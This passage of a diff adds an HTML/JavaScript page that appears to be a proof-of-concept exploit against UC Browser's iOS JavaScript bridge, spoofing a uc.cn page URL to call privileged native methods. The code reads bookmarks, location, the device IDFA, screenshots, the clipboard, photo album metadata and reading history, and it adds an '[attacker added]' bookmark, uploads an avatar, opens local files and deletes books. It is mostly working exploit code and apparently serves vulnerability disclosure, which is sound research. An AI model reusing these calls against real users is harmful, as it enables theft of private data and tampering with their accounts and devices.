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";
+        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+            invokeId: "callback",
+            methodName: "account.uploadCustomAvatar",
+            methodParams: {
+                base64_img: avatorb64
+            },
+            pageURL: "https://www.uc.cn/",
+            windowId: window.ucapi.windowId
+        }).then(function(a) {
+        });
+    }
+
+    document.getElementById("AddBookMark").onclick = function () {
+        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+            invokeId: "callback",
+            methodName: "base.addBookmark",
+            methodParams: {
+                url: "https://zhouziyi1.github.io",
+                title: "[attacker added] Bookmark page"
+            },
+            pageURL: "https://www.uc.cn/",
+            windowId: window.ucapi.windowId
+        }).then(function(a) {
+        });
+    }
+
+    var r = +new Date;
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "base.getBookmarkList",
+        methodParams: {
+            begin_index: 0,
+            count: 100
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+
+        var BookMarkNum = json.total_count;
+        const jsonData = json.list;
+        const bookmarkListElement = document.getElementById("BookMarkList");
+        bookmarkListElement.innerText = "Your BookMark List: \n\n" + "Total Count: " + BookMarkNum + "\n\n";
+        jsonData.forEach(bookmark => {
+            const bookmarkText = JSON.stringify(bookmark);
+            bookmarkListElement.innerText += bookmarkText + '\n\n';
+        });
+
+    });
+
+    var r = +new Date;
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "base.getUCParam",
+        methodParams: {
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function (a) {
+        var json = a;
+
+        var Location = json.cp;
+        const parts = Location.split(';');
+        const jsonData = {};
+        parts.forEach(part => {
+            const [key, value] = part.split(':');
+            jsonData[key] = value;
+        });
+
+        document.getElementById("Country").innerText = "Your Country: " + String(jsonData['na']) + " (" + String(jsonData['cc']) + ")";
+        document.getElementById("Province").innerText = "Your Province: " + String(jsonData['prov']);
+        document.getElementById("City").innerText = "Your City: " + String(jsonData['city']);
+        document.getElementById("BroadbandNetwork").innerText = "Your BroadbandNetwork: " + String(jsonData['isp']);
+    });
+
+    document.getElementById("OpenFile").onclick = function () {
+        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+            invokeId: "callback",
+            methodName: "base.openLocalFile",
+            methodParams: {
+                file_uri: "/private/var/mobile/Documents/localPDF.pdf",
+                by_system: 0
+            },
+            pageURL: "https://www.uc.cn/",
+            windowId: window.ucapi.windowId
+        }).then(function(a) {
+        });
+    }
+
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "biz.getIDFA",
+        methodParams: {
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+
+        var IDFA = json.idfa;
+        document.getElementById("IDFA").innerText = "Your Device IDFA: \n" + IDFA;
+    });
+
+    document.getElementById("AccessScreenShot").onclick = function () {
+        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+            invokeId: "callback",
+            methodName: "biz.getRecentlyScreenShot",
+            methodParams: {
+            },
+            pageURL: "https://www.uc.cn/",
+            windowId: window.ucapi.windowId
+        }).then(function(a) {
+            var json = a;
+
+            document.getElementById("RecentScreenShot").src = "data:image/png;base64,"+json.file_data;
+        });
+    }
+
+    document.getElementById("AccessClipBoard").onclick = function () {
+        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+            invokeId: "callback",
+            methodName: "clipboard.getClipBoardString",
+            methodParams: {
+            },
+            pageURL: "https://www.uc.cn/",
+            windowId: window.ucapi.windowId
+        }).then(function(a) {
+            var json = a;
+
+            document.getElementById("ClipBoardText").innerText = json.data;
+        });
+    }
+    
+    document.getElementById("WriteClipBoard").onclick = function () {
+        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+            invokeId: "callback",
+            methodName: "clipboard.setClipBoardString",
+            methodParams: {
+                data: document.getElementById("ClipBoardWriteText").innerText
+            },
+            pageURL: "https://www.uc.cn/",
+            windowId: window.ucapi.windowId
+        }).then(function(a) {
+        });
+    }
+
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "clouddrive.getAlbumInfo",
+        methodParams: {
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+        
+        var image_count = json.image_count;
+        var video_count = json.video_count;
+        document.getElementById("ImageCount").innerText = "Image Count: " + image_count;
+        document.getElementById("VideoCount").innerText = "Video Count: " + video_count;
+    });
+
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "clouddrive.getAlbumFileInfo",
+        methodParams: {
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+        
+        const albumInfoElement = document.getElementById("AlbumInfo");
+        let count = 0;
+        json.files.forEach(file => {
+            if (count < 5) {
+                const fileEntry = document.createElement('p');
+                fileEntry.innerText = `Height: ${file.height}, Width: ${file.width}, Media Type: ${file.media_type}, Local Identity: ${file.local_identity}`;
+                albumInfoElement.appendChild(fileEntry);
+                count++;
+            }
+        });
+        const ellipsis = document.createElement('p');
+        ellipsis.innerText = "(only show first 5) ............";
+        albumInfoElement.appendChild(ellipsis);
+    });
+
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "device.batteryLevel",
+        methodParams: {
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+
+        var level = json.level;
+        document.getElementById("Battery").innerText = "Your Device Battery Level: \n" + level + "%";
+    });
+
+    function convertToGB(bytes) {
+        var sizeInBytes = parseInt(bytes);
+        var sizeInGB = sizeInBytes / (1024 * 1024 * 1024);
+        return sizeInGB.toFixed(2) + "GB";
+    }
+
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "device.storageSpace",
+        methodParams: {
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+
+        var total_space = json.total_space;
+        var remaining_space = json.remaining_space;
+        document.getElementById("TotalStorage").innerText = "Your Device Total Storage: \n" + convertToGB(total_space);
+        document.getElementById("RemainingStorage").innerText = "Your Device Remaining Storage: \n" + convertToGB(remaining_space);
+    });
+
+    document.getElementById("VibrateDevice").onclick = function () {
+        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+            invokeId: "callback",
+            methodName: "device.vibrate",
+            methodParams: {
+            },
+            pageURL: "https://www.uc.cn/",
+            windowId: window.ucapi.windowId
+        }).then(function(a) {
+        });
+    }
+    
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "novel.getReadRecords",
+        methodParams: {
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+        
+        const jsonData = json.data;
+        const NovelRecordElement = document.getElementById("NovelRecord");
+        jsonData.forEach(NovelRecord => {
+            const NovelRecordText = JSON.stringify(NovelRecord);
+            NovelRecordElement.innerText += NovelRecordText + '\n\n';
+        });
+    });    
+
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "novel.queryAllOnlineBook",
+        methodParams: {
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+        
+        const jsonData = json.books;
+        const NovelBookShelfElement = document.getElementById("NovelBookShelf");
+        jsonData.forEach(NovelBookShelf => {
+            const NovelBookShelfText = JSON.stringify(NovelBookShelf);
+            NovelBookShelfElement.innerText += NovelBookShelfText + '\n\n';
+        });
+    });
+
+    document.getElementById("RemoveNovel").onclick = function () {
+        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+            invokeId: "callback",
+            methodName: "novel.removeFromBookshelf",
+            methodParams: {
+                book_id:"7955743"
+            },
+            pageURL: "https://www.uc.cn/",
+            windowId: window.ucapi.windowId
+        }).then(function(a) {
+        });
+    }
+
+    </script>
+
+</body>
+
+</html>
